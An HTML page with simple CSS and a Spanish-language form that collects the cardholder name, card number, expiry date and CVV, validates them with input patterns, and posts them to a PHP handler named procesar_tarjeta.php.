<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingrese Aqui sus datos</title>
    <style>
        /* Estilos básicos */
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"], input[type="number"], select {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h2>Ingrese aqui sus datos</h2>
    <form action="procesar_tarjeta.php" method="post">
        <label for="nombre">Nombre en la Tarjeta:</label>
        <input type="text" id="nombre" name="nombre" required>
        <label for="numero">Número de Tarjeta:</label>
        <input type="text" id="numero" name="numero" pattern="[0-9]{13,16}" required>
        <label for="vencimiento">Fecha de Vencimiento:</label>
        <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" required>
        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" pattern="[0-9]{3,4}" required>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
